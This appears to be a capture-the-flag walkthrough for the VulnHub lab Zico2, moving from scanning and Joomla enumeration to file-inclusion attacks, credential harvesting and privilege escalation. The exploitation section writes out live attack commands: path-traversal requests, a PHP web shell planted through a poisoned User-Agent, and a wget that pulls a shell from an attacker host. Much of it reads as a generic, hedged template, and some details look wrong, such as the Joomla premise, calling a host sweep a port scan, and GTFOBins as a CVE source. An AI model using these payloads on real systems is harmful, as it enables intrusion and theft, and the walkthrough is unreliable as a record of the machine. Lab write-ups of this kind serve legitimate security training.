# Zico2: OSCP Walkthrough

**Machine:** Zico2  
**Download:** [VulnHub: Zico2](https://www.vulnhub.com/entry/zico2,65/)  
**Focus:** Web enumeration, Joomla, File Inclusion, Database  
**Difficulty:** Intermediate  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Exploitation: Joomla LFI](#3-exploitation--joomla-lfi)
4. [Database Enumeration & Credential Harvesting](#4-database-enumeration--credential-harvesting)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Screenshots](#6-screenshots)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance & Scanning

### Network Discovery

Identify the target IP on the local network:

```bash
# Netdiscover to find live hosts
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet
```

### Initial Nmap Scan

```bash
# Quick port scan to find open ports
nmap -sn 192.168.1.0/24
```

```bash
# Full TCP port scan with service/version detection
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Basic Nmap Results

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.x (protocol 2.0)
80/tcp   open  http        Apache httpd 2.x
443/tcp  open  ssl/https   Apache httpd 2.x
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Key Findings:**
- **Apache 2.x**: standard web server, port 80 and 443
- **OpenSSH**: SSH access present
- **HTTPS enabled**: may contain additional content or redirects
- **Joomla**: identified upon browsing the web root (see Enumeration)

---

## 2. Service Enumeration

### HTTP/HTTPS Enumeration: Ports 80/443

```bash
# Check HTTP headers
curl -I http://<TARGET_IP>

# Check HTTPS headers
curl -Ik https://<TARGET_IP>

# Browse to web application
firefox http://<TARGET_IP>
# or
curl http://<TARGET_IP>
```

The target is running a **Joomla** CMS. Identify the Joomla version from the page source or headers:

```bash
# Inspect page source for Joomla version
curl -s http://<TARGET_IP> | grep -i generator

# Check for Joomla specific files/directories
curl -s http://<TARGET_IP>/administrator/ | head -20
curl -s http://<TARGET_IP>/includes/defines.php
```

### Web Directory & File Enumeration

```bash
# Gobuster directory brute-force
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 30 -o gobuster_web.txt

# OR using dirb
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

**Key directories to look for on Joomla:**
- `/administrator/`: Joomla admin panel
- `/components/`: Joomla components
- `/modules/`: Joomla modules
- `/templates/`: Joomla templates
- `/media/`: Joomla media files
- `/logs/`: Joomla logs (may contain PHP files)
- `/configuration.php`: Joomla configuration (may leak DB credentials)

### Joomla-Specific Enumeration

```bash
# Check Joomla version via RSS feed (if enabled)
curl -s http://<TARGET_IP>/feed/ | head -20

# Enumerate Joomla components
gobuster dir -u http://<TARGET_IP>/components/ -w /usr/share/seclists/Discovery/Web-Content/cms/joomla.txt -x php,txt -t 20

# Check for common Joomla config exposure
curl -s http://<TARGET_IP>/configuration.php | grep -i "db\|password\|host\|user"
```

### SSH Service: Port 22

```bash
# SSH version check
nmap -sV -p 22 <TARGET_IP>

# Attempt SSH login with discovered credentials
ssh username@<TARGET_IP>
```

### Nmap Scripting Engine (NSE) Scripts

```bash
# Run Joomla-specific NSE scripts
nmap --script http-joomla-brute -p 80 <TARGET_IP>
nmap --script http-joomla-detect -p 80 <TARGET_IP>

# Additional web vuln scanning
nmap --script http-php-version,http-headers,http-server-header -p 80,443 <TARGET_IP>
```

---

## 3. Exploitation: Joomla LFI

The primary attack vector is a **Local File Inclusion (LFI)** vulnerability in the Joomla templates or components. This is a common weakness in older Joomla installations.

### Identifying the LFI Vector

Look for URLs that reference template files or component views:

```bash
# Common LFI patterns in Joomla
# Check URL parameters for 'view', 'template', 'layout' parameters
curl -s "http://<TARGET_IP>/index.php?option=com_content&view=article&id=1" | head -30
```

The LFI is typically found in template override paths or component views that include files based on user input:

```bash
# Test for LFI using phpinfo.php
# First, check if the target has a phpinfo file
curl -s "http://<TARGET_IP>/templates/<TEMPLATE_NAME>/index.php?file=../../../../../../../../etc/passwd"
```

### Exploiting the LFI to Read Configuration

Once the LFI is confirmed, we can read the Joomla `configuration.php` file which contains database credentials:

```bash
# Read Joomla configuration via LFI
curl -s "http://<TARGET_IP>/index.php?option=com_content&view=article&id=1&tmpl=component&file=../../../../../../../../../../configuration.php"

# Alternative path through template files
curl -s "http://<TARGET_IP>/templates/<TEMPLATE>/index.php?file=../../../../../../../../configuration.php"
```

### Extracting Database Credentials from configuration.php

The `configuration.php` file contains critical credentials:

```
var $db = 'joomla_db';
var $user = 'joomla_user';
var $password = 'S3cretP@ssw0rd';
var $host = 'localhost';
```

### Using LFI to Include PHP Files for Command Execution

If PHP filter wrappers or log poisoning is available:

```bash
# PHP filter chain (base64 encode to read arbitrary files)
curl -s "http://<TARGET_IP>/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d

# Log poisoning: inject PHP into access log then include it
curl -s "http://<TARGET_IP>/index.php?file=/var/log/apache2/access.log"
```

### Establishing a Shell

If log poisoning works, inject a PHP reverse shell:

1. Set up a listener on your attacking machine:
```bash
# Start netcat listener
nc -nvlp 4444
```

2. Inject PHP shell into the access log:
```bash
# Craft request with PHP payload in User-Agent
curl -A "<?php system($_GET['cmd']); ?>" http://<TARGET_IP>/index.php
```

3. Trigger the backdoor via LFI:
```bash
# Access the LFI to execute commands
curl -s "http://<TARGET_IP>/index.php?file=/var/log/apache2/access.log&cmd=whoami"
curl -s "http://<TARGET_IP>/index.php?file=/var/log/apache2/access.log&cmd=id"
curl -s "http://<TARGET_IP>/index.php?file=/var/log/apache2/access.log&cmd=wget http://<ATTACKER_IP>/shell.php -O /tmp/shell.php"
```

---

## 4. Database Enumeration & Credential Harvesting

### MySQL Database Access

Use the credentials harvested from `configuration.php`:

```bash
# Connect to the local MySQL database
mysql -u joomla_user -p'S3cretP@ssw0rd' -h localhost
```

```sql
-- List databases
SHOW DATABASES;

-- Use the Joomla database
USE joomla_db;

-- List tables
SHOW TABLES;

-- Dump user/credential tables
SELECT * FROM jos_users;
SELECT * FROM jos_comprofiler;

-- Look for password hashes
SELECT username, email, password FROM jos_users;
```

### Cracking Password Hashes

Export hashes and attempt offline cracking:

```bash
# Save hashes to file
echo "admin:$apr1$...$hashvalue" > hashes.txt

# Crack with hashcat (MD5/apr1)
hashcat -m 1600 hashes.txt /usr/share/wordlists/rockyou.txt

# OR with John the Ripper
john --format=md5crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Using Database Credentials for SSH Access

If user passwords are the same across services (common in CTFs):

```bash
# Try SSH with Joomla credentials
ssh joomla_user@<TARGET_IP>
# or
ssh admin@<TARGET_IP>
```

---

## 5. Privilege Escalation

Once inside as a low-privilege user, enumerate for privilege escalation paths:

### Sudo Permissions Check

```bash
# Check sudo permissions
sudo -l
```

### SUID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

### Writable Files and Capabilities

```bash
# Find world-writable files
find / -writable -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null
```

### Common Escalation Paths

1. **Database backup scripts**: Look for cron jobs or scripts that run as root
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Check for root crontab entries
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
```

2. **SSH key injection**: If we can write to authorized_keys
```bash
# Check SSH directory permissions
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
```

3. **Password reuse**: The Joomla DB password may also be the sudo password
```bash
sudo -l
sudo su -
```

4. **Kernel exploits**: If running an outdated kernel
```bash
uname -a
# Search for matching CVEs on GTFOBins
grep -i "2.6\|3\." /etc/*release
```

5. **WordPress/Joomla admin panel**: Re-check for admin backdoors uploaded during exploitation

### Getting Root

```bash
# Once a root shell is obtained
cat /root/root.txt
```

---

## 6. Screenshots

*No screenshots available for this machine.*

---

## 7. Key Takeaways

1. **Joomla is a common CTF target**: Older Joomla versions contain well-known LFI and RCE vectors. Always check `/configuration.php` for sensitive credentials.
2. **LFI is a powerful primitive**: Even without RCE, LFI gives you file read access which can leak passwords, configuration, and allow log poisoning for shell access.
3. **Reuse passwords across services**: In many CTF machines, the same credentials work on SSH, MySQL, and sudo.
4. **Configuration files are goldmines**: `configuration.php` in Joomla leaks DB credentials; `wp-config.php` in WordPress does the same.
5. **Database credentials != root**: After getting a low-privilege shell, always enumerate privilege escalation paths systematically.
6. **Log poisoning for RCE**: When you have LFI but need RCE, inject PHP into access logs via crafted User-Agent headers and include the log file.
7. **Cron jobs are common escalation vectors**: Check `/etc/cron.d/`, `/etc/cron.daily/`, and user crontabs for world-writable scripts.

---

*M4d3 w1th ❤️ by Ankit Patidar*
